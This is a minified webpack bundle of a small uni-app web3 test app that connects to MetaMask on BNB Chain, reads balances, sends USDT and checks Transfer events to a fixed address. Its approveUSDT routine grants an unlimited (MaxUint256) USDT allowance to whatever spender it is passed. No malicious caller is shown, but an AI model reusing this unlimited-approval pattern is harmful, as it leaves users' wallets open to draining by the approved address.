(function(e){function n(n){for(var a,o,u=n[0],s=n[1],c=n[2],l=0,f=[];l<u.length;l++)o=u[l],Object.prototype.hasOwnProperty.call(i,o)&&i[o]&&f.push(i[o][0]),i[o]=0;for(a in s)Object.prototype.hasOwnProperty.call(s,a)&&(e[a]=s[a]);d&&d(n);while(f.length)f.shift()();return r.push.apply(r,c||[]),t()}function t(){for(var e,n=0;n<r.length;n++){for(var t=r[n],a=!0,u=1;u<t.length;u++){var s=t[u];0!==i[s]&&(a=!1)}a&&(r.splice(n--,1),e=o(o.s=t[0]))}return e}var a={},i={index:0},r=[];function o(n){if(a[n])return a[n].exports;var t=a[n]={i:n,l:!1,exports:{}};return e[n].call(t.exports,t,t.exports,o),t.l=!0,t.exports}o.e=function(e){var n=[],t=i[e];if(0!==t)if(t)n.push(t[2]);else{var a=new Promise((function(n,a){t=i[e]=[n,a]}));n.push(t[2]=a);var r,u=document.createElement("script");u.charset="utf-8",u.timeout=120,o.nc&&u.setAttribute("nonce",o.nc),u.src=function(e){return o.p+"static/js/"+({"pages-index-index":"pages-index-index"}[e]||e)+"."+{"pages-index-index":"993a6b05"}[e]+".js"}(e);var s=new Error;r=function(n){u.onerror=u.onload=null,clearTimeout(c);var t=i[e];if(0!==t){if(t){var a=n&&("load"===n.type?"missing":n.type),r=n&&n.target&&n.target.src;s.message="Loading chunk "+e+" failed.\n("+a+": "+r+")",s.name="ChunkLoadError",s.type=a,s.request=r,t[1](s)}i[e]=void 0}};var c=setTimeout((function(){r({type:"timeout",target:u})}),12e4);u.onerror=u.onload=r,document.head.appendChild(u)}return Promise.all(n)},o.m=e,o.c=a,o.d=function(e,n,t){o.o(e,n)||Object.defineProperty(e,n,{enumerable:!0,get:t})},o.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},o.t=function(e,n){if(1&n&&(e=o(e)),8&n)return e;if(4&n&&"object"===typeof e&&e&&e.__esModule)return e;var t=Object.create(null);if(o.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:e}),2&n&&"string"!=typeof e)for(var a in e)o.d(t,a,function(n){return e[n]}.bind(null,a));return t},o.n=function(e){var n=e&&e.__esModule?function(){return e["default"]}:function(){return e};return o.d(n,"a",n),n},o.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},o.p="./",o.oe=function(e){throw console.error(e),e};var u=window["webpackJsonp"]=window["webpackJsonp"]||[],s=u.push.bind(u);u.push=n,u=u.slice();for(var c=0;c<u.length;c++)n(u[c]);var d=s;r.push([0,"chunk-vendors"]),t()})({0:function(e,n,t){e.exports=t("fdbc")},1:function(e,n){},2:function(e,n){},3:function(e,n){},3073:function(e,n,t){"use strict";t.r(n);var a=t("689b"),i=t.n(a);for(var r in a)["default"].indexOf(r)<0&&function(e){t.d(n,e,(function(){return a[e]}))}(r);n["default"]=i.a},4:function(e,n){},"5c3a":function(e,n,t){"use strict";(function(e){t("7a82");var a=t("4ea4").default;Object.defineProperty(n,"__esModule",{value:!0}),n.default=void 0,t("d3b7"),t("d401"),t("25f0");var i=a(t("c7eb")),r=a(t("1da1")),o=a(t("d4ec")),u=a(t("bee2")),s=a(t("2909")),c=a(t("5850")),d=t("2921"),l=a(t("6d9f")),f=(0,s.default)(l.default),p="0x55d398326f99059fF775485246999027B3197955",w=function(){function n(){(0,o.default)(this,n),this.address="",this.bnbBalance=0,this.usdtBalance=0}return(0,u.default)(n,[{key:"initializeWeb3",value:function(){return new Promise((function(n,t){window.ethereum?(window.web3=new c.default(window.ethereum),window.ethereum.enable().then((function(){window.web3.eth.net.isListening().then((function(){n(!0),e("log","已连接到币安链"," at utils/web3/web3.js:26")})).catch((function(){e("error","未连接到币安链，请切换网络"," at utils/web3/web3.js:30"),t()}))}))):e("error","未检测到MetaMask插件，请安装并登录MetaMask"," at utils/web3/web3.js:35")}))}},{key:"getAddress",value:function(){var e=this;return new Promise((function(n,t){if(window.ethereum){var a=new c.default(window.ethereum);a.eth.getAccounts().then((function(t){e.address=t[0],n(e.address)}))}}))}},{key:"getBnbBalance",value:function(){var e=this;return new Promise((function(n,t){if(window.ethereum){var a=new c.default(window.ethereum);a.eth.getBalance(e.address).then((function(t){e.bnbBalance=a.utils.fromWei(t),n(e.bnbBalance)}))}}))}},{key:"getCoinBalance",value:function(){var n=(0,r.default)((0,i.default)().mark((function n(t,a){var r=this;return(0,i.default)().wrap((function(n){while(1)switch(n.prev=n.next){case 0:return n.abrupt("return",new Promise((function(n,a){var i=window.web3.eth.abi.encodeFunctionCall({name:"balanceOf",type:"function",inputs:[{type:"address",name:"account"}]},[r.address]);window.web3.eth.call({to:t,data:i},(function(t,a){if(t)e("error",t," at utils/web3/web3.js:80");else{var i=1e6*window.web3.utils.fromWei(a,"mether");n(i)}}))})));case 1:case"end":return n.stop()}}),n)})));return function(e,t){return n.apply(this,arguments)}}()},{key:"transfer",value:function(n,t){var a=this;return new Promise((function(i,r){if(window.ethereum){var o=new c.default(window.ethereum),u=new o.eth.Contract([{constant:!1,inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transfer",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"}],p),s=o.utils.toWei(n+"","ether");uni.showLoading({title:"转账中"}),u.methods.transfer(t,s).send({from:a.address}).then((function(n){uni.hideLoading(),e("log","转账成功"," at utils/web3/web3.js:128"),i(n.transactionHash)})).catch((function(n){uni.hideLoading(),e("log","拒绝授权 or 交易失败"," at utils/web3/web3.js:133"),e("log",n," at utils/web3/web3.js:134")}))}}))}},{key:"callContract",value:function(){var n=(0,r.default)((0,i.default)().mark((function n(t,a){var r,o,u;return(0,i.default)().wrap((function(n){while(1)switch(n.prev=n.next){case 0:return n.prev=0,r=new window.web3.eth.Contract(f,t),n.next=4,r.methods[a](this.address).call();case 4:return o=n.sent,e("log",o," at utils/web3/web3.js:144"),u=new Promise((function(e,n){e(o)})),n.abrupt("return",u);case 10:n.prev=10,n.t0=n["catch"](0),e("error","callContract 失败",n.t0," at utils/web3/web3.js:150");case 13:case"end":return n.stop()}}),n,this,[[0,10]])})));return function(e,t){return n.apply(this,arguments)}}()},{key:"callWriteContract",value:function(){var n=(0,r.default)((0,i.default)().mark((function n(t,a,r,o){var u,s;return(0,i.default)().wrap((function(n){while(1)switch(n.prev=n.next){case 0:return n.prev=0,u=new window.web3.eth.Contract(f,t),n.next=4,u.methods[a](r).send(o);case 4:return s=n.sent,n.abrupt("return",new Promise((function(e,n){s.status?e(!0):n()})));case 8:n.prev=8,n.t0=n["catch"](0),e("error","stakeApply 失败",n.t0," at utils/web3/web3.js:167");case 11:case"end":return n.stop()}}),n,null,[[0,8]])})));return function(e,t,a,i){return n.apply(this,arguments)}}()},{key:"approveUSDT",value:function(){var n=(0,r.default)((0,i.default)().mark((function n(t){var a,r,o,u,s;return(0,i.default)().wrap((function(n){while(1)switch(n.prev=n.next){case 0:return n.prev=0,a=new window.web3.eth.Contract(f,p),n.next=4,a.methods.allowance(this.address,t).call();case 4:if(r=n.sent,!(r>0)){n.next=7;break}return n.abrupt("return");case 7:return n.prev=7,window.web3=new c.default(window.ethereum),o=new window.web3.eth.Contract(f,p),uni.showLoading({title:"usdt授权中。。。"}),u=d.MaxUint256.toString(),55e4,n.next=15,o.methods.approve(t,u).send({from:this.address,gasPrice:window.web3.utils.toWei("10","Gwei"),gasLimit:55e4});case 15:s=n.sent,e("log","usdt 成功",s," at utils/web3/web3.js:191"),uni.hideLoading(),n.next=23;break;case 20:n.prev=20,n.t0=n["catch"](7),e("error","usdt 失败",n.t0," at utils/web3/web3.js:194");case 23:e("log","usdt 成功",r," at utils/web3/web3.js:196"),n.next=30;break;case 26:n.prev=26,n.t1=n["catch"](0),e("error","usdt 失败",n.t1," at utils/web3/web3.js:198"),uni.hideLoading();case 30:case"end":return n.stop()}}),n,this,[[0,26],[7,20]])})));return function(e){return n.apply(this,arguments)}}()},{key:"getBlockNumber",value:function(){return new Promise((function(e,n){window.web3.eth.getBlockNumber().then((function(n){e(n)})).catch((function(e){n(e)}))}))}},{key:"getPastEvents",value:function(n){var a=this,o=new Promise((function(o,u){var s=t("5850"),c=new s("https://rpc-bsc.48.club"),d=n-5e3,l=n,f=a.insertStr(a.address,2,"000000000000000000000000").toLowerCase(),p=["0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",f,"0x000000000000000000000000b6a576725913d57808ed9f4aa953176c0b5f089c"],w=pastEventsABI,y=function(){var n=(0,r.default)((0,i.default)().mark((function n(){var t,a;return(0,i.default)().wrap((function(n){while(1)switch(n.prev=n.next){case 0:return t=new c.eth.Contract(w,"0x55d398326f99059fF775485246999027B3197955"),n.prev=1,n.next=4,t.getPastEvents("Transfer",{fromBlock:d,toBlock:l,topics:p});case 4:a=n.sent,o(a),n.next=12;break;case 8:n.prev=8,n.t0=n["catch"](1),u(n.t0),e("error","查询转账事件时发生错误：".concat(n.t0)," at utils/web3/web3.js:242");case 12:case"end":return n.stop()}}),n,null,[[1,8]])})));return function(){return n.apply(this,arguments)}}();y()}));return o}},{key:"insertStr",value:function(e,n,t){return e.substring(0,n)+t+e.substring(n)}}]),n}(),y=w;n.default=y}).call(this,t("0de9")["log"])},6829:function(e,n,t){var a=t("24fb");n=a(!1),n.push([e.i,"\n\n\n\n\n\n\n\n\n\n\n\n/*每个页面公共css */",""]),e.exports=n},"689b":function(e,n,t){"use strict";t("7a82"),Object.defineProperty(n,"__esModule",{value:!0}),n.default=void 0;n.default={onLaunch:function(){},onShow:function(){},onHide:function(){}}},"6d9f":function(e){e.exports=JSON.parse('[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')},7536:function(e,n,t){"use strict";t.d(n,"b",(function(){return a})),t.d(n,"c",(function(){return i})),t.d(n,"a",(function(){}));var a=function(){var e=this.$createElement,n=this._self._c||e;return n("App",{attrs:{keepAliveInclude:this.keepAliveInclude}})},i=[]},"835c":function(e,n,t){var a=t("7037").default;t("d3b7"),uni.addInterceptor({returnValue:function(e){return!e||"object"!==a(e)&&"function"!==typeof e||"function"!==typeof e.then?e:new Promise((function(n,t){e.then((function(e){return e[0]?t(e[0]):n(e[1])}))}))}})},"9e94":function(e,n,t){"use strict";t.r(n);var a=t("7536"),i=t("3073");for(var r in i)["default"].indexOf(r)<0&&function(e){t.d(n,e,(function(){return i[e]}))}(r);t("cbde");var o=t("f0c5"),u=Object(o["a"])(i["default"],a["b"],a["c"],!1,null,null,null,!1,a["a"],void 0);n["default"]=u.exports},ac47:function(e,n,t){"use strict";(function(e){var n=t("4ea4").default;t("13d5"),t("d3b7"),t("ddb0"),t("ac1f"),t("5319");var a=n(t("e143")),i={keys:function(){return[]}};e["____C68E820____"]=!0,delete e["____C68E820____"],e.__uniConfig={globalStyle:{navigationBarTextStyle:"black",navigationBarTitleText:"uni-app",navigationBarBackgroundColor:"#F8F8F8",backgroundColor:"#F8F8F8"},uniIdRouter:{}},e.__uniConfig.compilerVersion="3.6.13",e.__uniConfig.darkmode=!1,e.__uniConfig.themeConfig={},e.__uniConfig.uniPlatform="h5",e.__uniConfig.appId="__UNI__C68E820",e.__uniConfig.appName="web3-test",e.__uniConfig.appVersion="1.0.0",e.__uniConfig.appVersionCode="100",e.__uniConfig.router={mode:"hash",base:"./"},e.__uniConfig.publicPath="./",e.__uniConfig["async"]={loading:"AsyncLoading",error:"AsyncError",delay:200,timeout:6e4},e.__uniConfig.debug=!1,e.__uniConfig.networkTimeout={request:6e4,connectSocket:6e4,uploadFile:6e4,downloadFile:6e4},e.__uniConfig.sdkConfigs={},e.__uniConfig.qqMapKey=void 0,e.__uniConfig.googleMapKey=void 0,e.__uniConfig.aMapKey=void 0,e.__uniConfig.aMapSecurityJsCode=void 0,e.__uniConfig.aMapServiceHost=void 0,e.__uniConfig.locale="",e.__uniConfig.fallbackLocale=void 0,e.__uniConfig.locales=i.keys().reduce((function(e,n){var t=n.replace(/\.\/(uni-app.)?(.*).json/,"$2"),a=i(n);return Object.assign(e[t]||(e[t]={}),a.common||a),e}),{}),e.__uniConfig.nvue={"flex-direction":"column"},e.__uniConfig.__webpack_chunk_load__=t.e,a.default.component("pages-index-index",(function(e){var n={component:t.e("pages-index-index").then(function(){return e(t("604f"))}.bind(null,t)).catch(t.oe),delay:__uniConfig["async"].delay,timeout:__uniConfig["async"].timeout};return __uniConfig["async"]["loading"]&&(n.loading={name:"SystemAsyncLoading",render:function(e){return e(__uniConfig["async"]["loading"])}}),__uniConfig["async"]["error"]&&(n.error={name:"SystemAsyncError",render:function(e){return e(__uniConfig["async"]["error"])}}),n})),e.__uniRoutes=[{path:"/",alias:"/pages/index/index",component:{render:function(e){return e("Page",{props:Object.assign({isQuit:!0,isEntry:!0},__uniConfig.globalStyle,{navigationBarTitleText:"uni-app"})},[e("pages-index-index",{slot:"page"})])}},meta:{id:1,name:"pages-index-index",isNVue:!1,maxWidth:0,pagePath:"pages/index/index",isQuit:!0,isEntry:!0,windowTop:44}},{path:"/choose-location",component:{render:function(e){return e("Page",{props:{navigationStyle:"custom"}},[e("system-choose-location",{slot:"page"})])}},meta:{name:"choose-location",pagePath:"/choose-location"}},{path:"/open-location",component:{render:function(e){return e("Page",{props:{navigationStyle:"custom"}},[e("system-open-location",{slot:"page"})])}},meta:{name:"open-location",pagePath:"/open-location"}}],e.UniApp&&new e.UniApp}).call(this,t("c8ba"))},b120:function(e,n,t){var a=t("6829");a.__esModule&&(a=a.default),"string"===typeof a&&(a=[[e.i,a,""]]),a.locals&&(e.exports=a.locals);var i=t("4f06").default;i("2cc14de2",a,!0,{sourceMap:!1,shadowMode:!1})},cbde:function(e,n,t){"use strict";var a=t("b120"),i=t.n(a);i.a},fdbc:function(e,n,t){"use strict";var a=t("4ea4").default,i=a(t("5530"));t("e260"),t("e6cf"),t("cca6"),t("a79d"),t("ac47"),t("1c31");var r=a(t("9e94")),o=a(t("e143"));t("835c");var u=a(t("5c3a"));o.default.config.productionTip=!1,o.default.prototype.$web3=new u.default,r.default.mpType="app";var s=new o.default((0,i.default)({},r.default));s.$mount()}});